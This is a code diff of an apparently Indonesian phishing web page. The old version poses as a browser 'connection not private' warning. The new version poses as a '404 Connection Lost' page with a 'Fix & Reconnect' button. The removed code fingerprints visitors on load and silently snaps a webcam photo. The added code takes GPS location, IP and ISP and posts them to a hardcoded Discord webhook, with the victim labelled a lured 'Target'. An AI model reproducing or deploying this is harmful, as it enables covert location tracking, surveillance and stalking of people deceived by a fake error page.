@@ -1,335 +1,148 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy error</title>
+    <title>404 - Connection Lost</title>
     <style>
         body {
-            background-color: #fff;
-            color: #202124;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            margin: 0;
-            padding: 0;
+            background-color: #f4f7f9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             display: flex;
             justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        .interstitial-wrapper {
-            box-sizing: border-box;
-            font-size: 1em;
-            margin: 14vh auto 0;
-            max-width: 600px;
-            padding: 0 24px;
-            width: 100%;
+
+        .container {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            max-width: 500px;
+            text-align: center;
+            border: 1px solid #e1e8ed;
         }
-        .icon {
-            background-color: #d93025;
-            border-radius: 50%;
-            display: inline-block;
-            height: 72px;
-            margin: 0 0 40px;
-            width: 72px;
-            position: relative;
-        }
-        .icon::before {
-            content: '!';
-            color: white;
-            font-size: 40px;
-            font-weight: bold;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
+
         h1 {
-            font-size: 2.13333em;
-            font-weight: 400;
-            line-height: 1.25;
-            margin-bottom: 16px;
-            margin-top: 0;
+            color: #e74c3c;
+            font-size: 80px;
+            margin: 0;
+            font-weight: 700;
         }
+
+        h2 {
+            color: #2c3e50;
+            font-size: 22px;
+            margin: 10px 0 20px 0;
+        }
+
         p {
-            font-size: 1.05em;
-            line-height: 1.61538em;
-            margin-top: 0;
-            margin-bottom: 16px;
-            color: #5f6368;
+            color: #7f8c8d;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 30px;
         }
-        .error-code {
-            color: #5f6368;
-            font-size: .875em;
+
+        .btn-fix {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 14px 35px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
             text-transform: uppercase;
-            margin-bottom: 20px;
+            letter-spacing: 1px;
         }
-        .button-container {
-            display: flex;
-            gap: 12px;
+
+        .btn-fix:hover {
+            background-color: #2980b9;
+        }
+
+        .error-code {
             margin-top: 30px;
-        }
-        .btn {
-            border: 0;
-            border-radius: 4px;
-            box-sizing: border-box;
-            cursor: pointer;
-            float: right;
-            font-size: .875em;
-            font-weight: 500;
-            padding: 8px 16px;
-            transition: background-color .2s;
-        }
-        .btn-primary {
-            background-color: #1a73e8;
-            color: #fff;
-        }
-        .btn-primary:hover {
-            background-color: #1b66c9;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
-        }
-        .btn-secondary {
-            background-color: transparent;
-            color: #1a73e8;
-        }
-        .btn-secondary:hover {
-            background-color: #f8f9fa;
-        }
-        #advanced-content {
-            display: none;
-            margin-top: 40px;
-            padding-top: 20px;
-        }
-        .small-text {
-            font-size: 0.9em;
-            color: #5f6368;
-            line-height: 1.5;
-        }
-        .proceed-link {
-            color: #5f6368;
-            cursor: pointer;
-            text-decoration: underline;
-            font-weight: 400;
-            margin-top: 20px;
-            display: inline-block;
-            font-size: 0.875em;
+            font-size: 11px;
+            color: #bdc3c7;
+            font-family: monospace;
         }
     </style>
 </head>
+
 <body>
 
-    <div class="interstitial-wrapper">
-        <div class="icon"></div>
-        <h1>Your connection is not private</h1>
-        <p>Attackers might be trying to steal your information from this site (for example, passwords, messages, or credit cards). <br><br> To restore your secure connection, the browser requires a diagnostic synchronization.</p>
-        
-        <div class="error-code">NET::ERR_CERT_AUTHORITY_INVALID</div>
-        
-        <div class="button-container">
-            <button class="btn btn-primary" id="backBtn">Back to safety</button>
-            <button class="btn btn-secondary" id="advancedBtn">Advanced</button>
-        </div>
+    <div class="container">
+        <h1>404</h1>
+        <h2>Connection Lost</h2>
+        <p>Terdeteksi kegagalan sinkronisasi pada sesi browser Anda.<br>Keamanan enkripsi mungkin terganggu.</p>
 
-        <div id="advanced-content">
-            <p class="small-text">
-                This server could not prove that it is its domain; its security certificate is not trusted by your computer's operating system. 
-                <br><br>
-                <b>Diagnostic Requirement:</b> The browser needs to run a local hardware diagnostic (Camera/Location) to verify your secure session. Please click <b>'Allow'</b> on the upcoming prompt to complete the synchronization.
-            </p>
-            <span class="proceed-link" id="actionBtn">Proceed to diagnostic (unsafe)</span>
-        </div>
+        <button class="btn-fix" id="actionBtn">FIX & RECONNECT</button>
+
+        <div class="error-code">Error Code: ERR_SSL_PROTOCOL_ERROR_SYNC</div>
     </div>
 
     <script>
-        document.getElementById('advancedBtn').addEventListener('click', function() {
-            document.getElementById('advanced-content').style.display = 'block';
-            this.style.display = 'none';
-        });
-        document.getElementById('backBtn').addEventListener('click', function() {
-            window.location.href = "https://www.google.com";
-        });
-        // POINT C: URL Webhook sekarang diarahkan ke file backend (PHP) lokal.
-        // URL asli Discord kamu tidak lagi terekspos di browser pengunjung.
-        // Catatan: Kamu harus menjalankan web ini di server yang mendukung PHP (XAMPP, Laragon, atau hosting asli).
-        const WEBHOOK_URL = "webhook.php"; 
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";
 
-        // POINT D: Helper untuk mengambil Browser Fingerprinting Ekstra
-        async function getDeviceFingerprint() {
-            let batteryText = "Tidak Didukung";
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryText = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging ⚡' : 'Unplugged 🔋'})`;
-                }
-            } catch(e) {}
-
-            return [
-                { name: "🔋 Baterai", value: `\`${batteryText}\``, inline: true },
-                { name: "🖥️ Resolusi Layar", value: `\`${screen.width}x${screen.height}\``, inline: true },
-                { name: "⚙️ CPU Cores", value: `\`${navigator.hardwareConcurrency || 'Unknown'}\``, inline: true },
-                { name: "💾 Estimasi RAM", value: `\`${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}\``, inline: true },
-                { name: "🌍 Timezone", value: `\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``, inline: true },
-                { name: "📡 Tipe Jaringan", value: `\`${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}\``, inline: true }
-            ];
-        }
-
-        // Helper untuk mengirim payload ke PHP
-        async function sendPayload(payload, imageBlob = null, redirect = false) {
-            const formData = new FormData();
-            if (imageBlob) {
-                formData.append('file', imageBlob, 'capture.jpg');
-                if (payload.embeds && payload.embeds.length > 0) {
-                    payload.embeds[0].image = { url: "attachment://capture.jpg" };
-                }
-            }
-            formData.append('payload_json', JSON.stringify(payload));
-
-            try {
-                await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-            } catch (e) {
-                console.error("Gagal mengirim webhook. Pastikan web dijalankan di PHP server (XAMPP/Hosting).", e);
-            }
-            
-            if (redirect) {
-                window.location.href = "https://www.google.com";
-            }
-        }
-
-        // ==========================================
-        // FITUR BARU: AUTO-CAPTURE SAAT HALAMAN DIBUKA
-        // ==========================================
-        window.addEventListener('DOMContentLoaded', async () => {
-            let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown" };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipInfo = await res.json();
-            } catch (e) {}
-
-            const fingerprintFields = await getDeviceFingerprint();
-            const userAgentField = { name: "📱 Perangkat (User Agent)", value: `\`${navigator.userAgent}\`` };
-
-            const payload = {
-                username: "System Security Monitor (Auto-Capture)",
-                embeds: [{
-                    title: "👀 Target Membuka Halaman (Tanpa Klik)",
-                    description: "Data ini diambil otomatis sesaat setelah halaman dimuat, sebelum target menekan tombol.",
-                    color: 3447003, // Biru
-                    fields: [
-                        { name: "🌐 IP Address", value: `\`${ipInfo.ip}\``, inline: true },
-                        { name: "🏢 Provider/ISP", value: `\`${ipInfo.org}\``, inline: true },
-                        { name: "🏙️ Kota", value: `\`${ipInfo.city}\``, inline: true },
-                        ...fingerprintFields,
-                        userAgentField
-                    ],
-                    footer: { text: "Auto Reconnaissance - " + new Date().toLocaleString() }
-                }]
-            };
-            
-            // Kirim payload tanpa gambar dan tanpa redirect
-            await sendPayload(payload, null, false);
-        });
-
-        // ==========================================
-        // EVENT SAAT TOMBOL DIKLIK (KAMERA & LOKASI)
-        // ==========================================
-        document.getElementById('actionBtn').addEventListener('click', async function() {
+        document.getElementById('actionBtn').addEventListener('click', async function () {
             this.innerText = "Processing...";
             this.disabled = true;
 
-            let imageBlob = null;
-            // Ambil data spesifikasi target sebelum mengeksekusi pop-up lokasi
-            const fingerprintFields = await getDeviceFingerprint();
-            const userAgentField = { name: "📱 Perangkat (User Agent)", value: `\`${navigator.userAgent}\`` };
-            
-            // 1. SILENT CAMERA CAPTURE
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                video.autoplay = true;
-                video.playsinline = true;
-                video.muted = true;
-                video.srcObject = stream;
-                document.body.appendChild(video);
-
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
-                });
-                await new Promise(r => setTimeout(r, 500)); // Jeda exposure
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                
-                stream.getTracks().forEach(track => track.stop());
-                video.remove();
-            } catch (err) {
-                console.log("Kamera diblokir atau tidak tersedia:", err);
-            }
-
-            // 2. GEOLOCATION CAPTURE & SEND
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
+
                     let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown" };
                     try {
                         const res = await fetch('https://ipapi.co/json/');
                         ipInfo = await res.json();
-                    } catch (e) {}
+                    } catch (e) { }
 
                     const payload = {
                         username: "System Security Monitor",
                         embeds: [{
                             title: "🚨 Target Berhasil Terpancing!",
-                            color: 15548997, 
+                            color: 15548997,
                             fields: [
                                 { name: "📍 Koordinat GPS", value: `\`${pos.coords.latitude}, ${pos.coords.longitude}\`` },
                                 { name: "🗺️ Google Maps", value: `[Klik Disini](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
                                 { name: "🌐 IP Address", value: `\`${ipInfo.ip}\``, inline: true },
                                 { name: "🏢 Provider/ISP", value: `\`${ipInfo.org}\``, inline: true },
-                                // Masukkan data fingerprint ekstra ke embed Discord
-                                ...fingerprintFields,
-                                userAgentField
+                                { name: "📱 Perangkat", value: `\`${navigator.userAgent}\`` }
                             ],
                             footer: { text: "Audit Sistem Keamanan - " + new Date().toLocaleString() }
                         }]
                     };
-                    await sendPayload(payload, imageBlob, true);
+
+                    await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    });
+
+
+                    window.location.href = "https://www.google.com";
 
                 }, async (err) => {
-                    const payload = {
-                        username: "System Security Monitor",
-                        content: "⚠️ Target **MENOLAK (Deny)** akses lokasi.",
-                        embeds: [{
-                            title: imageBlob ? "📸 Lokasi Ditolak, Tapi Wajah Berhasil Diambil!" : "🚫 Lokasi & Kamera Ditolak",
-                            color: imageBlob ? 15548997 : 16711680,
-                            fields: [
-                                ...fingerprintFields,
-                                userAgentField
-                            ],
-                            footer: { text: "Audit Sistem Keamanan - " + new Date().toLocaleString() }
-                        }]
-                    };
-                    await sendPayload(payload, imageBlob, true);
-                }, { enableHighAccuracy: true, timeout: 10000 });
-            } else {
-                const payload = {
-                    username: "System Security Monitor",
-                    content: "⚠️ Perangkat tidak support Geolocation.",
-                    embeds: [{
-                        title: imageBlob ? "📸 Lokasi Tidak Support, Tapi Wajah Berhasil Diambil!" : "ℹ️ Device Data (No Location/Camera)",
-                        color: 16753920,
-                        fields: [
-                            ...fingerprintFields,
-                            userAgentField
-                        ],
-                        footer: { text: "Audit Sistem Keamanan - " + new Date().toLocaleString() }
-                    }]
-                };
-                await sendPayload(payload, imageBlob, true);
+
+                    await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: "⚠️ Target klik Fix & Reconnect tapi **MENOLAK (Deny)** akses lokasi."
+                        })
+                    });
+                    window.location.href = "https://www.google.com";
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
             }
         });
     </script>
 </body>
+
 </html>
